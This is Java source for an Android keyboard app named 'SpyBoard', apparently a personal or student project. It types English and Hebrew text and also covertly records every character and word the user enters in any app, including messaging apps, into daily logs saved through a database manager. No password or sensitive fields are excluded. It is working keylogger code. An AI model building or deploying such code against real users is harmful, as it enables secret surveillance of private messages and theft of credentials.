package com.idankorenisraeli.spyboard.input;

import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;
import android.widget.Toast;

import com.idankorenisraeli.spyboard.common.TimeManager;
import com.idankorenisraeli.spyboard.data.DailyUsageLog;
import com.idankorenisraeli.spyboard.data.DatabaseManager;
import com.idankorenisraeli.spyboard.data.OnDailyLogLoaded;
import com.idankorenisraeli.spyboard.data.UsageLog;
import com.idankorenisraeli.spyboard.utils.KeycodeDictionary;
import com.idankorenisraeli.spyboard.R;

/**
 * This class will simulate the functionality of an android keyboard,
 * With custom tracking of all the pressed keys
 */
public class SpyInputMethodService extends android.inputmethodservice.InputMethodService {
    SpyKeyboardView keyboardView;
    KeycodeDictionary dictionary;

    boolean caps = false;
    boolean hebrewMode = false;
    boolean symbol = false;


    Keyboard engKeyboard, hebKeyboard, symbolKeyboard;

    String currentDate;
    DailyUsageLog dailyLog;
    UsageLog sessionUsageLog;


    private static final int WORD_EST_LENGTH = 16; // size of new sb for better performance
    StringBuilder lastWordBuilder = new StringBuilder(WORD_EST_LENGTH); //Saving the last word user typed


    DatabaseManager databaseManager;


    interface KEYS {
        int ENTER = -10;
        int SYMBOL = -3;
    }

    @Override
    public View onCreateInputView() {
        keyboardView = (SpyKeyboardView) getLayoutInflater().inflate(R.layout.keyboard_view_blue, null);
        initKeyboards();
        initDailyLog();

        return keyboardView;
    }

    private void initKeyboards() {
        engKeyboard = new Keyboard(this, R.xml.qwerty_eng);
        hebKeyboard = new Keyboard(this, R.xml.qwerty_heb);
        symbolKeyboard = new Keyboard(this, R.xml.symbols_board);

        dictionary = KeycodeDictionary.getInstance();

        keyboardView.setKeyboard(hebrewMode ? hebKeyboard : engKeyboard);
        keyboardView.setOnKeyboardActionListener(keyBoardAction);

        keyboardView.setPreviewEnabled(false);

    }

    private void initDailyLog() {
        databaseManager = DatabaseManager.getInstance();
        currentDate = TimeManager.getInstance().getDateOfToday();
        databaseManager.loadDailyLog(currentDate, new OnDailyLogLoaded() {
            @Override
            public void onDailyLogLoaded(DailyUsageLog loadedLog) {
                if (loadedLog != null)
                    dailyLog = loadedLog;
                else {
                    dailyLog = new DailyUsageLog();
                    Toast.makeText(SpyInputMethodService.this, "New Log " + currentDate.toString() , Toast.LENGTH_SHORT).show();
                }
            }
        });
    }


    //region Keyboard Actions
    private void languageAction() {
        hebrewMode = !hebrewMode;
        keyboardView.setKeyboard(hebrewMode ? hebKeyboard : engKeyboard);
        // Updating the keyboard view based on the current mode
    }

    private void symbolAction() {
        symbol = !symbol;
        if (symbol) {
            keyboardView.setKeyboard(symbolKeyboard);
        } else
            keyboardView.setKeyboard(hebrewMode ? hebKeyboard : engKeyboard);
    }

    private void deleteAction(InputConnection ic) {
        CharSequence selectedText = ic.getSelectedText(0);
        if (TextUtils.isEmpty(selectedText)) {
            // no selection, so delete previous character
            ic.deleteSurroundingText(1, 0);
            if (lastWordBuilder.length() > 0)
                lastWordBuilder.deleteCharAt(lastWordBuilder.length() - 1);
        } else {
            // delete the selection
            ic.commitText("", 1);
        }
    }

    private void shiftAction() {
        caps = !caps;
        keyboardView.setShifted(caps);
    }

    private void enterAction(InputConnection ic) {
        ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
    }

    private void charAction(int primaryCode, InputConnection ic) {
        String typed = codeToString(primaryCode);
        ic.commitText(typed, 1); //writing to screen

        if (keyboardView.isShifted())
            shiftAction();

        trackKeyPress(typed);
    }


    private void trackKeyPress(String typed) {
        if (sessionUsageLog != null) {
            if (typed.equals(" ")) {
                trackWordByCursor();
                lastWordBuilder = new StringBuilder(WORD_EST_LENGTH);
                //reset the strbuilder
            } else {
                sessionUsageLog.addChar(typed); //Adding to single chars map
                lastWordBuilder.append(typed);
            }
        }
    }


    /**
     * This method will use the pointer of the keyboard
     * to detect the last word.
     * most of the times it will be enough to get the last word accurately.
     * but when user click on something that is out of the keyboard like a send button
     * we need to get the last word with the builder
     */
    private void trackWordByCursor() {
        String word;
        InputConnection ic = getCurrentInputConnection();
        word = (String) ic.getTextBeforeCursor(64, 0);
        if (word == null || word.length() <= 1)
            return; //No last word, just a space

        if (word.charAt(word.length() - 1) == ' ')
            word = word.substring(0, word.length() - 1); //delete space after word

        int lastSpaceIndex = word.lastIndexOf(' ') + 1; //delete space before word
        word = word.substring(lastSpaceIndex);


        sessionUsageLog.addWord(word);
    }

    /**
     * In case of when user presses on "send" button
     * or something similar which is outside of the keyboard
     * we will track the last word by the builder
     */
    private void trackWordByBuilder(){
        if (lastWordBuilder.length() > 0)
            sessionUsageLog.addWord(lastWordBuilder.toString());
        lastWordBuilder = new StringBuilder(WORD_EST_LENGTH);
    }

    private String codeToString(int primaryCode) {
        char finalCode;
        if (primaryCode == ' ')
            finalCode = ' ';
        else {
            if (hebrewMode) {
                finalCode = dictionary.engToHeb(primaryCode);
            } else {
                primaryCode = caps ? primaryCode + ('A' - 'a') : primaryCode; // converting to upper case when shift
                finalCode = (char) primaryCode; // converting to char
            }
        }

        return String.valueOf(finalCode);
    }

    //endregion


    KeyboardView.OnKeyboardActionListener keyBoardAction = new KeyboardView.OnKeyboardActionListener() {
        @Override
        public void onPress(int primaryCode) {
        }

        @Override
        public void onRelease(int primaryCode) {

        }


        @Override
        public void onKey(int primaryCode, int[] keyCodes) {
            InputConnection ic = getCurrentInputConnection();
            if (ic == null) return;
            if (!isTextBefore()) {
                trackWordByCursor();
            }
            switch (primaryCode) {
                case Keyboard.KEYCODE_DELETE:
                    deleteAction(ic);
                    break;
                case Keyboard.KEYCODE_SHIFT:
                    shiftAction();
                    break;
                case Keyboard.KEYCODE_MODE_CHANGE:
                    languageAction();
                    break;
                case KEYS.ENTER:
                    enterAction(ic);
                    break;
                case KEYS.SYMBOL:
                    symbolAction();
                    break;
                default:
                    charAction(primaryCode, ic);
            }
        }


        @Override
        public void onText(CharSequence text) {
        }

        @Override
        public void swipeLeft() {

        }

        @Override
        public void swipeRight() {

        }

        @Override
        public void swipeDown() {

        }

        @Override
        public void swipeUp() {

        }
    };


    /**
     * This method will calculate if there is a text before current ic
     * It will help us calcualte a new word even though user did not press the spacebar
     * because in messaging apps, like whatsapp, there is a 'send' key which is not a part of the keyboard
     * and there is still a new word there that needs to be tacked.
     *
     * @return true when there is a text before the cursor
     */
    private boolean isTextBefore() {
        InputConnection ic = getCurrentInputConnection();
        return ic.getTextBeforeCursor(1, 0).length() != 0;
    }


    @Override
    public void onStartInputView(EditorInfo info, boolean restarting) {
        super.onStartInputView(info, restarting);

        if (sessionUsageLog == null)
            sessionUsageLog = new UsageLog();

        if (!currentDate.equals(TimeManager.getInstance().getDateOfToday())) {
            // new day
            endInputSession(); //restart the current session
            currentDate = TimeManager.getInstance().getDateOfToday();
            dailyLog = new DailyUsageLog(); //restart the daily log
        }

    }


    //This called before onStarted
    @Override
    public void onStartInput(EditorInfo attribute, boolean restarting) {
        super.onStartInput(attribute, restarting);


        if (keyboardView != null && keyboardView.isShifted())
            shiftAction();

        if (symbol)
            symbolAction();
    }


    @Override
    public void onFinishInputView(boolean finishingInput) {
        super.onFinishInputView(finishingInput);

        endInputSession();

        if (dailyLog != null) {
            Log.i("pttt", "Saving daily with " + dailyLog.getWordFreq().size() + " words");
            databaseManager.saveDailyLog(dailyLog);
            //Saving into database
        }
    }


    @Override
    public void onWindowShown() {
        // This method calls when keyboard pops up and when user press send/enter in outer app
        trackWordByBuilder();
        super.onWindowShown();
    }

    @Override
    public void onWindowHidden() {
        super.onWindowHidden();
    }


    private void endInputSession() {
        trackWordByBuilder();
        //Adding the last word written in this session
        //Here we cannot use the cursor cause message might have been alrady sent

        Log.i("pttt", "Words:" + sessionUsageLog.getWordFreq());
        if (dailyLog != null)
            dailyLog.addLog(sessionUsageLog);
        else
            Log.i("pttt", "DailyLog is null");
        //Adding the session data that is finished to the day's total

        Log.i("pttt", "Date: " + currentDate);

        sessionUsageLog = new UsageLog();
        // New keyboard usage
    }


}